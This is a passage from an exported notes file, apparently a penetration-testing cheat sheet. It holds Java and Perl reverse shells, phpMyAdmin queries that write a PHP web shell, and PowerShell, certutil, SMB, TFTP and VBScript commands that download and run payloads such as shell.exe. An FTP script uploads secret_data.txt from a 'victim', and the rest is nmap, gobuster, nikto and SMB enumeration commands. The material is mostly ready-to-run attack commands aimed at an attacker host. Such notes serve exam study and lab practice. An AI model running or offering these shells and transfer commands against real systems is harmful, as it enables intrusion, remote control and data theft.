          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Perl</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">perl -MIO </rich_text>
          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">PhpmyAdmin
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Unix</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
        </node>
      </node>
      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Powershell</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
          <rich_text>
Very helpful for chars that need to be escaped otherwise.

</rich_text>
          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
powershell.exe -NoProfile -encoded $Encoded</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</rich_text>
        </node>
        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Certutil</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
          <rich_text>

</rich_text>
        </node>
        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">SMB</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
        </node>
        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">PureFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Install</rich_text>
          <rich_text>
apt-get update </rich_text>
          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
          <rich_text> apt-get install pure-ftpd

</rich_text>
          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
          <rich_text family="monospace">/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd myftpuser -u ftpuser -d /ftphome
pure-pw mkdb
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
          <rich_text family="monospace"> /etc/pure-ftpd/auth/
sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Reset Password</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">pure-pw mkdb</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Restart Service</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
          <rich_text>)
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> open 192.168.0.</rich_text>
          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> USER myftpuser</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> mypassword</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bin</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">atftpd --daemon --port 69 /var/tftp</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">tftp -i 192.168.0.1 GET whoami.exe</rich_text>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1687292565">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

Set the </rich_text>
        <rich_text family="monospace">--insecuressl</rich_text>
        <rich_text> flag.</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.208.53 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.208.53 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.208.53 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@192.168.208.53  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwardi</rich_text>
        <rich_text justification="left" scale="h2"></rich_text>
        <rich_text scale="h2">ng:</rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.208.53 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@192.168.208.53</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.208.53 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.208.53 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1687690153">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_________________________________________

Also check

</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 192.168.208.53</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 192.168.208.53</codebox>
        <codebox char_offset="104" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.208.53</codebox>
        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 192.168.208.53 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="178" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 192.168.208.53</codebox>
        <codebox char_offset="242" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 192.168.208.53</codebox>
        <codebox char_offset="249" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 192.168.208.53</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1688334012">
        <rich_text>


</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
